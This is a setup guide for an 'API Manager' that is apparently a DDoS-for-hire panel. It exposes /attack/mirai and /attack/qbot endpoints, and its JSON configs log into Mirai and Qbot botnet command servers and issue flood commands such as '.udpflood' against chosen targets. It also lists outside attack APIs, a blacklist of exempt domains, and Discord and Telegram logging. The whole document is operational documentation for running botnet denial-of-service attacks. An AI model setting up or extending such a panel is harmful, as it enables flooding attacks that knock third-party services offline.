## API Manager Configuration Setup

This guide will walk you through the setup process for configuring the API Manager using the provided `settings.json` file.

### 1. Locate the Configuration File

Navigate to the directory where the API Manager files are located. Look for the `settings.json` file in the configuration directory.

### 2. Edit the `settings.json` File

Open the `settings.json` file using a text editor of your choice. This file contains all the configuration parameters for the API Manager.

### 3. Configure Listener Settings

Specify the listener address and port where the API Manager should listen for incoming requests:

```json
"listener": "127.0.0.1:8090"
```

### 4. Configure API Keys
Add authorized API keys to the api_keys array:

```json
"api_keys": ["key1", "key2", "key3"]
```

### 5. Configure Blacklist

Define entities or keywords to be blacklisted in the blacklist array:

```json
"blacklist": [ "1.1.1.1", "8.8.8.8", "0.0.0.0", "1.1.2.2", "9.9.9.9", "gov", "gov.uk", "gov.uk", "google.com", "google.co.uk", "discord.com", "discordapp.com", "github.com", "github.io" ]
```

## 6. Configure Timeout
Set the timeout duration in seconds for various operations:

```json
"timeout": 3
```

### 7. Configure Endpoints
Define the endpoints for different API operations:

```json
"endpoints": {
    "mirai": "/attack/mirai",
    "qbot": "/attack/qbot",
    "api": "/attack/api"
}
```

### 8. Configure Logging
Specify logging settings for Discord and Telegram:

```json
"logs": {
    "discord": {
        "enabled": true,
        "webhook": "https://discord.com/api/webhooks/your_webhook_url"
    },
    "telegram": {
        "enabled": true,
        "token": "your_telegram_bot_token",
        "chat_id": "your_telegram_chat_id"
    }
}
```



### 9. Save the Configuration
Save the changes to the settings.json file.


### 10. Start the API Manager
Start the API Manager using the following command:

```bash
./api_manager
```

## Adding More Methods to `api.json`

The `api.json` file contains configurations for various API methods that the API Manager can handle. Each method can have multiple targets and specific settings. Here's how you can add more methods:

### 1. Open the `api.json` File
Locate and open the `api.json` file in a text editor.

### 2. Add a New Method Configuration
Add the new method configuration directly into the `methods` array. Ensure each method has a unique identifier. For example, let's add a method named `"exampleMethod"`:

```json
"exampleMethod": {
    "enabled": true,
    "maxtime": 300,
    "targets": [
        {
            "method": "example-method",
            "target": "https://example-api.com/",
            "pathEncoding": false,
            "verbosity": true
        },
        {
            "method": "example-method1",
            "target": "https://example-api2.com/",
            "pathEncoding": false,
            "verbosity": true
        }
    ]
}
```

### 3. Configure the New Method:
- **enabled**: Set to true to enable the method, or false to disable it.
- **maxtime**: Specify the maximum duration (in seconds) for the method execution.
- **targets**: Define an array of targets for the method, each with its own settings.
  - **method**: Unique identifier for the target.
  - **target**: URL of the target endpoint.
  - **pathEncoding**: Set to true if path encoding is required, or false if not.
  - **verbosity**: Set to true for verbose logging, or false for standard logging.

### 4. Save the Changes:
Save the `api.json` file with the new method configuration.

## Adding More Methods to `mirai.json`

The `mirai.json` file contains configurations for various Mirai attack methods that the API Manager can handle. Each method can have multiple servers and specific settings. Here's how you can add more methods:

### 1. Open the `mirai.json` File
Locate and open the `mirai.json` file in a text editor.

### 2. Add a New Method Configuration
Add the new method configuration directly into the `mirais` object. Ensure each method has a unique identifier. For example, let's add a method named `"exampleMethod"`:

```json
"exampleMethod": {
    "enabled": true,
    "maxtime": 300,
    "servers": [
        {
            "ip": "127.0.0.1",
            "port": 5555,
            "time_between_commands": 500,
            "commands": [
                "root",
                "password",
                ".udpflood <<$target>> <<$duration>> port=<<$port>>"
            ]
        }
    ]
}
```

### 3. Configure the New Method:
- **enabled**: Set to true to enable the method, or false to disable it.
- **maxtime**: Specify the maximum duration (in seconds) for the method execution.
- **servers**: Define an array of servers for the method, each with its own settings.
  - **ip**: IP address of the server.
  - **port**: Port of the server.
  - **time_between_commands**: Time between each command execution (in milliseconds).
  - **commands**: Array of commands to execute on the server.

### 4. Save the Changes:

Save the `mirai.json` file with the new method configuration.

## Adding More Methods to `qbot.json`

The `qbot.json` file contains configurations for various Qbot attack methods that the API Manager can handle. Each method can have multiple servers and specific settings. Here's how you can add more methods:

### 1. Open the `qbot.json` File
Locate and open the `qbot.json` file in a text editor.

### 2. Add a New Method Configuration
Add the new method configuration directly into the `qbots` object. Ensure each method has a unique identifier. For example, let's add a method named `"exampleMethod"`:

```json
"exampleMethod": {
    "enabled": true,
    "maxtime": 300,
    "servers": [
        {
            "ip": "127.0.0.1",
            "port": 5555,
            "time_between_commands": 500,
            "commands": [
                "root",
                "password",
                ".example_method_command <<$target>> <<$duration>> port=<<$port>>"
            ]
        }
    ]
}
```

### 3. Configure the New Method:
- **enabled**: Set to true to enable the method, or false to disable it.
- **maxtime**: Specify the maximum duration (in seconds) for the method execution.
- **servers**: Define an array of servers for the method, each with its own settings.
  - **ip**: IP address of the server.
  - **port**: Port of the server.
  - **time_between_commands**: Time between each command execution (in milliseconds).
  - **commands**: Array of commands to execute on the server.

### 4. Save the Changes:
Save the `qbot.json` file with the new method configuration.

## Note: After every change in any JSON file, the API Manager needs to be restarted.
